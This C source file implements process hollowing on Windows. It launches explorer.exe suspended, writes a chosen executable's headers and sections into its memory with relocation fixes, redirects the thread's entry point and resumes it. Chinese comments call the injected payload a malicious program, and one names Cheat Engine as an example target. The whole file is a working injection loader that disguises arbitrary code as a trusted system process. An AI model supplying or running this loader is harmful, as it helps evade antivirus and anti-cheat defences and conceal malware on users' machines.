#include <stdio.h>
#include <Windows.h>
#include "LoadPE.h"
#include "LoadPE2.h"

/*
Tips: CE程序的重定位表没有被擦除

*/

typedef NTSTATUS(NTAPI* pNtUnmapViewOfSection)(HANDLE, PVOID);

int main(int argc, wchar_t* argv[])
{
    // 定义变量和结构体
    IN PIMAGE_DOS_HEADER pDosHeaders = 0;
    IN PIMAGE_NT_HEADERS pNtHeaders = 0 ;
    IN PIMAGE_SECTION_HEADER pSectionHeaders = 0;
    IN PVOID FileImage = 0;
    IN HANDLE hFile = 0;
    OUT DWORD FileReadSize = 0;
    IN DWORD dwFileSize = 0;
    IN PVOID RemoteImageBase = 0;
    IN PVOID RemoteProcessMemory = 0;
    STARTUPINFOW si = { 0 };
    PROCESS_INFORMATION pi = { 0 };
    CONTEXT ctx = { 0 };
    ctx.ContextFlags = CONTEXT_FULL;
    si.cb = sizeof(si);
    TCHAR szShellProcess[0x100] = TEXT("explorer.exe");
    //用于替换的恶意程序
    TCHAR szTargetProcess[MAX_PATH] = { 0 }; // "E:/SoftWare/CheatEngine/cheatengine-x86_64.exe";
    TCHAR szTargetProcessDirectory[MAX_PATH] = { 0 }; 
    printf("Target program path(no space): ");
    wscanf_s(TEXT("%s"), szTargetProcess,MAX_PATH);
    printf("Target program directory(no space): ");
    wscanf_s(TEXT("%s"), szTargetProcessDirectory, MAX_PATH);

    // 创建挂起的cmd进程
    BOOL bRet = CreateProcessW(
        NULL,
        szShellProcess,
        NULL,
        NULL,
        FALSE,
        CREATE_SUSPENDED,
        NULL,
        szTargetProcessDirectory,
        &si,
        &pi);

    //读取恶意程序的内容至本进程内存中
    hFile = CreateFileW(szTargetProcess, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    dwFileSize = GetFileSize(hFile, NULL); //获取替换可执行文件的大小
    FileImage = VirtualAlloc(NULL, dwFileSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (hFile==INVALID_HANDLE_VALUE||!ReadFile(hFile, FileImage, dwFileSize, &FileReadSize, NULL))
    {
        TerminateProcess(pi.hProcess,0);
        return 0;
    }

    //获取恶意程序的文件头信息(Dos头和Nt头)
    pDosHeaders = (PIMAGE_DOS_HEADER)FileImage;  //获取Dos头
    pNtHeaders = (PIMAGE_NT_HEADERS)((LPBYTE)FileImage + pDosHeaders->e_lfanew); //获取NT头

    //获取挂起进程的上下文
    GetThreadContext(pi.hThread, &ctx);

    //获取挂起进程的映像基址
#ifdef _WIN64
    ReadProcessMemory(pi.hProcess, (PVOID)(ctx.Rdx + (sizeof(SIZE_T) * 2)), &RemoteImageBase, sizeof(PVOID), NULL);
    // 从rbx寄存器中获取PEB地址，并从PEB中读取可执行映像的基址
#endif
    // 从ebx寄存器中获取PEB地址，并从PEB中读取可执行映像的基址
#ifdef _X86_
    ReadProcessMemory(pi.hProcess, (PVOID)(ctx.Ebx + 8), &RemoteImageBase, sizeof(PVOID), NULL);
#endif


    //判断文件预期加载地址是否被占用
    pNtUnmapViewOfSection NtUnmapViewOfSection = (pNtUnmapViewOfSection)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtUnmapViewOfSection");
    //if ((SIZE_T)RemoteImageBase == pNtHeaders->OptionalHeader.ImageBase)
    //{
    //    NtUnmapViewOfSection(pi.hProcess, RemoteImageBase); //卸载已存在文件
    //}

    //为可执行映像分配内存,并写入文件头 +pNtHeaders->OptionalHeader.ImageBase
    UINT i = 1;
    TCHAR str[0x30] = { 0 };
    do {
        swprintf_s(str, TEXT("Imgbase:0x%x"), (int)pNtHeaders->OptionalHeader.ImageBase * i);
        // if (i != 0) MessageBox(0, str, 0, 0);
        RemoteProcessMemory = VirtualAllocEx(pi.hProcess, (PVOID)(pNtHeaders->OptionalHeader.ImageBase * i++), pNtHeaders->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    } while (RemoteProcessMemory == NULL);

    // 判断是否修改重定位表
    if ((SIZE_T)RemoteProcessMemory != (SIZE_T)pNtHeaders->OptionalHeader.ImageBase)
    {
        RepairByRelocTable((LPBYTE)FileImage, (SIZE_T)RemoteProcessMemory);
    }

    WriteProcessMemory(pi.hProcess, RemoteProcessMemory, FileImage, pNtHeaders->OptionalHeader.SizeOfHeaders, NULL);

    //逐段写入
    for (int i = 0; i < pNtHeaders->FileHeader.NumberOfSections; i++)
    {
        pSectionHeaders = (PIMAGE_SECTION_HEADER)((LPBYTE)FileImage + pDosHeaders->e_lfanew + sizeof(IMAGE_NT_HEADERS) + (i * sizeof(IMAGE_SECTION_HEADER)));
        WriteProcessMemory(pi.hProcess, (PVOID)((LPBYTE)RemoteProcessMemory + pSectionHeaders->VirtualAddress), (PVOID)((LPBYTE)FileImage + pSectionHeaders->PointerToRawData), pSectionHeaders->SizeOfRawData, NULL);
    }

    //将rax寄存器设置为注入软件的入口点
#ifdef _WIN64
    ctx.Rcx = (SIZE_T)((LPBYTE)RemoteProcessMemory + pNtHeaders->OptionalHeader.AddressOfEntryPoint);
    WriteProcessMemory(pi.hProcess, (PVOID)(ctx.Rdx + (sizeof(SIZE_T) * 2)), &RemoteProcessMemory, sizeof(PVOID), NULL);
#endif
    //将eax寄存器设置为注入软件的入口点
#ifdef _X86_
    ctx.Eax = (SIZE_T)((LPBYTE)RemoteProcessMemory + pNtHeaders->OptionalHeader.AddressOfEntryPoint);
    WriteProcessMemory(pi.hProcess, (PVOID)(ctx.Ebx + (sizeof(SIZE_T) * 2)), &pNtHeaders->OptionalHeader.ImageBase, sizeof(PVOID), NULL);
    /*
    lea eax
    call eax
    */
#endif

    SetThreadContext(pi.hThread, &ctx); // 设置线程上下文
    ResumeThread(pi.hThread); // 恢复挂起线程
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    return 0;
}
